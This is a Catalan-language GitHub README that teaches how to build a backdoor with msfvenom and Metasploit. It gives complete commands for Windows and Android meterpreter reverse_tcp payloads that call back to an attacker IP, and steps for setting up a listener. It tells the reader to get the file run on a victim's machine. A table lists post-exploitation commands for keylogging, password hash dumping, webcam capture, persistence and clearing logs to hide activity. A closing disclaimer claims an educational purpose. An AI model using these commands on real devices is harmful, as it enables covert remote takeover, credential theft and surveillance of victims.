<p align="center">
  <img src="https://github.com/Gerijacki.png" width="100" alt="Logo"/><br/>
  Hi üëã, I'm <a href="https://github.com/Gerijacki">Gerijacki</a>
</p>

<p align="center">
    <a href="https://github.com/Gerijacki/yt_mp4/stargazers"><img src="https://img.shields.io/github/stars/Gerijacki/yt_mp4?colorA=363a4f&colorB=b7bdf8&style=for-the-badge"></a>
    <a href="https://github.com/Gerijacki/yt_mp4/issues"><img src="https://img.shields.io/github/issues/Gerijacki/yt_mp4?colorA=363a4f&colorB=f5a97f&style=for-the-badge"></a>
    <a href="https://github.com/Gerijacki/yt_mp4/contributors"><img src="https://img.shields.io/github/contributors/Gerijacki/yt_mp4?colorA=363a4f&colorB=a6da95&style=for-the-badge"></a>
</p>

# Metaexploit_msfvenom üöÄ

En aquest projecte us explicar√© com utilitzar `msfvenom` i `Metasploit` per crear una backdoor a qualsevol dispositiu a trav√©s d'un arxiu malici√≥s.

## MSFVENOM
`Msfvenom` √©s una eina potent de generaci√≥ d'exploits del framework `Metasploit`, utilitzada per crear c√†rregues √∫tils de malware personalitzades. Permet generar diferents tipus d'arxius maliciosos, com arxius executables, documents ofuscats o scripts, amb l'objectiu d'explotar vulnerabilitats en sistemes inform√†tics per a fins de prova o atacs.

### Com configurar un arxiu malici√≥s:

1. Primer de tot hem de tenir el framework `Metasploit` instal¬∑lat.
2. Ara crearem el payload utilitzant la seg√ºent estructura:
   ```
   msfvenom [payload] (LHOST) (LPORT)[Output name and format]
   ```
   Un exemple seria el seg√ºent:
   ```
   msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.172.128 LPORT=4444 -o ejemplo.apk
   ```
   **Important:** El tipus de payload que utilitzem determinar√† en qu√® del dispositiu afectar√† el nostre binari. Podeu veure tots els payloads fent la comanda
   ```
   msfvenom -l
   ```
3. Per configurar el payload b√© hem de configurar els seg√ºents par√†metres de la seg√ºent manera:
   - `LHOST`: Ip de la m√†quina atacant (P√∫blica o privada, si √©s privada, la v√≠ctima ha d'estar a la mateixa xarxa que nosaltres)
   - `LPORT`: Port que utilitzarem per connectar-nos a la m√†quina. Recomano utilitzar un port que Windows no utilitzi per res m√©s (en aquest cas el 4444)
   - `Payload`: Per crear una sessi√≥ remota (backdoor) utilitzarem `meterpreter`.
   - `Arquitectura`: En cas que vulguem infectar un ordinador, has d'indicar si vols un payload de 32 bits o 64 bits.
   - `Output`: Nom i format en els que exportar√†s el "virus".
   - `Format`: Format en qu√® exportar√†s el payload.

4. Per fer un payload de Windows l'estructura √©s la seg√ºent:
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ip m√†quina atacant) LPORT=4444 -a x86 -p windows -f exe > ejemplo.exe
   ```
5. Per fer un payload d'Android l'estructura √©s la seg√ºent:
   ```
   msfvenom -p android/meterpreter/reverse_tcp LHOST=(ip m√†quina atacant) LPORT=4444 -o ejemplo.apk
   ```

   ![Payload de windows](./media/1.png)

   ![Payload d'android](./media/2.png)

## Metasploit
`Metasploit` √©s una plataforma de proves d'intrusi√≥ i desenvolupament d'exploits, que ofereix una gamma d'eines i m√≤duls per a l'exploraci√≥, l'avaluaci√≥ de vulnerabilitats i l'execuci√≥ d'atacs en sistemes inform√†tics. √âs utilitzada per professionals de seguretat inform√†tica per detectar i corregir debilitats en els sistemes o per a fins maliciosos per part de cibercriminals.

### Com funciona:

Un cop tenim el payload creat, hem de configurar `Metasploit` per posar la nostra m√†quina en "Escolta" i aix√≠ poder-nos connectar.

1. Entrem a `Metasploit`
   ```
   msfconsole
   ```
2. Configurem quin payload/exploit volem utilitzar
   ```
   use exploit/multi/handler
   ```
   Ara el payload:
   **Important:** Utilitzar a `Metasploit` el mateix payload que hem configurat amb `msfvenom`
   ```
   set payload windows/meterpreter/reverse_tcp
   ```
3. Ara hem de configurar `LHOST` i `LPORT`
   ```
   set LHOST "IPm√†quinaatacant"
   ```
   ```
   set LPORT 4444
   ```
4. Executem la comanda `options` per veure si tot est√† configurat i iniciem `Metasploit`.
   ```
   options
   ```
   Per iniciar:
   ```
   run
   ```

Ara nom√©s ens queda executar el malware a la m√†quina v√≠ctima i, com que tindrem la m√†quina atacant en escolta, es connectar√† autom√†ticament.

![Metasploit](./media/3.png)

## Meterpreter
`Meterpreter` √©s un payload altament flexible i potent del framework `Metasploit` que s'utilitza per a l'explotaci√≥ remota de sistemes. Proporciona un acc√©s complet i control sobre la m√†quina compromesa, permetent executar comandes, obtenir informaci√≥ i realitzar diverses accions malicioses. √âs

 √†mpliament utilitzat per professionals de la seguretat inform√†tica per a prop√≤sits d'auditoria i proves d'intrusi√≥.

### Com funciona:

![Meterpreter](./media/4.png)

Un cop tenim acc√©s a trav√©s de `Meterpreter`, algunes comandes interessants s√≥n les seguents:

| Comanda         | Descripci√≥                                                  |
| --------------- | ----------------------------------------------------------- |
| `sysinfo`       | Obt√© informaci√≥ detallada del sistema comprom√®s.            |
| `shell`         | Crea una shell interactiva en el sistema comprom√®s.         |
| `ps`            | Llista els processos en execuci√≥ al sistema comprom√®s.      |
| `getuid`        | Mostra el nom d'usuari actual al sistema comprom√®s.         |
| `upload`        | Carrega un fitxer local al sistema comprom√®s.               |
| `download`      | Descarrega un fitxer del sistema comprom√®s al teu local.    |
| `keyscan_start` | Inicia l'enregistrament de pulsacions de teclat.            |
| `keyscan_dump`  | Recupera les pulsacions de teclat enregistrades.            |
| `migrate`       | Canvia al proc√©s especificat, escapant de l'execuci√≥ actual.|
| `execute`       | Executa una comanda en el sistema comprom√®s.                |
| `screenshot`    | Captura una imatge de la pantalla del sistema comprom√®s.    |
| `webcam_snap`   | Captura una imatge utilitzant la c√†mera web del sistema comprom√®s. |
| `keyscan_stop`  | Atura l'enregistrament de pulsacions de teclat.                        |
| `download_all`  | Descarrega tots els fitxers del sistema comprom√®s a la teva m√†quina.   |
| `portfwd`       | Reenvia els ports locals o remots per a l'acc√©s a serveis remots.      |
| `pivot_tcp`     | Estableix una connexi√≥ TCP a trav√©s d'un salt (pivot) des de la v√≠ctima. |
| `run persistence`| Estableix persist√®ncia en el sistema comprom√®s per a reinicis posteriors. |
| `clearev`       | Elimina les entrades d'events de seguretat per a ocultar l'activitat. |
| `getsystem`     | Intenta obtenir privilegis de sistema m√©s alts en el sistema comprom√®s. |
| `portscan`      | Escaneja els ports oberts en el sistema comprom√®s.                     |
| `hashdump`      | Recupera les contrasenyes emmagatzemades en el sistema comprom√®s.           |
| `getpid`        | Obt√© l'identificador del proc√©s actual en el sistema comprom√®s.             |
| `enumdesktops`  | Enumera els escriptoris actius en el sistema comprom√®s.                     |
| `getprivs`      | Mostra els privilegis actuals del proc√©s en el sistema comprom√®s.          |
| `enum_users`    | Enumera els usuaris i grups en el sistema comprom√®s.                        |
| `enum_shares`   | Enumera les carpetes compartides en el sistema comprom√®s.                   |
| `execute_script`| Executa un script de llenguatge espec√≠fic en el sistema comprom√®s.          |
| `local_exploit_suggest`| Suggereix exploits locals adequats basats en les vulnerabilitats detectades.|
| `timestomp`     | Modifica els timestamps de fitxers per a ocultar l'activitat maliciosa.     |
| `steal_token`   | Roba el token d'identitat d'un proc√©s en execuci√≥ per a elevaci√≥ de privilegis. |

## DISCLAIMER

El projecte ha estat desenvolupat amb l'objectiu de proporcionar als estudiants i als professionals de la seguretat inform√†tica una eina per comprendre les vulnerabilitats dels sistemes inform√†tics i les t√®cniques que poden utilitzar els hackers per accedir a informaci√≥ confidencial. No ens fem responsables dels possibles usos inadequats que se li puguin donar a aquesta eina.

<div align="center">
  <img src="https://github.com/Gerijacki/readme-palette/blob/main/roll.gif" alt="Rickroll">
</div>

---
<p align="center">Copyright &copy; 2021-present <a href="https://github.com/Gerijacki" target="_blank">Gerijacki Org</a>
<p align="center"><a href="https://github.com/Gerijacki/readme-palette/blob/main/LICENSE"><img src="https://img.shields.io/static/v1.svg?style=for-the-badge&label=License&message=MIT&logoColor=d9e0ee&colorA=363a4f&colorB=b7bdf8"/></a></p>


<img src="https://raw.githubusercontent.com/Trilokia/Trilokia/379277808c61ef204768a61bbc5d25bc7798ccf1/bottom_header.svg" />